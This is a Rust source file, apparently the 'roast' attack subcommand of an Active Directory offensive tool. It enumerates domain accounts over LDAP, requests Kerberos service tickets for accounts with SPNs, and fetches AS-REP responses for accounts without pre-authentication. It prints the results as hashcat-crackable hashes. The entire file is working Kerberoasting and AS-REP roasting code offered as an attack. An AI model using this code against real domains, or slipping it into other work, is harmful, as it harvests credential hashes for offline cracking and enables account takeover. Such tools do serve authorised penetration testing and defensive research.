//! `attack roast` — Kerberoast (SPN → TGS-REP RC4/AES) + AS-REP roast
//! (no-preauth accounts) hashcat output. Reuses `ScanArgs` since the
//! collector needs an identical LDAP + KDC config.

use adhammer_collector::Collector;
use anyhow::Result;

use crate::attacks::scan::{config, ScanArgs};

pub(crate) async fn roast(a: ScanArgs) -> Result<()> {
    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let realm = snap
        .domain
        .domain_dn
        .split(',')
        .filter_map(|p| p.strip_prefix("DC="))
        .collect::<Vec<_>>()
        .join(".")
        .to_uppercase();
    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);

    println!("== Kerberoastable ({}) ==", kerberoast.len());
    match &a.kdc {
        None => {
            for c in &kerberoast {
                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
            }
        }
        Some(kdc) if !kerberoast.is_empty() => {
            // One authenticated TGT, then a TGS-REQ per SPN.
            match adhammer_kerberos::get_tgt(&a.user, &a.password, &realm, kdc).await {
                Err(e) => eprintln!("  TGT acquisition failed: {e}"),
                Ok(tgt) => {
                    for c in &kerberoast {
                        let spn = c.spn.as_deref().unwrap_or_default();
                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
                            Ok(hash) => println!("{hash}"),
                            Err(e) => eprintln!("  {}: {e}", c.sam),
                        }
                    }
                }
            }
        }
        Some(_) => {}
    }

    println!("== AS-REP roastable ({}) ==", asrep.len());
    match &a.kdc {
        None => {
            for c in &asrep {
                println!("  {}", c.sam);
            }
            if !asrep.is_empty() {
                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
            }
        }
        Some(kdc) => {
            for c in &asrep {
                match adhammer_kerberos::asrep_roast(c, kdc).await {
                    Ok(hash) => println!("{hash}"),
                    Err(e) => eprintln!("  {}: {e}", c.sam),
                }
            }
        }
    }
    Ok(())
}
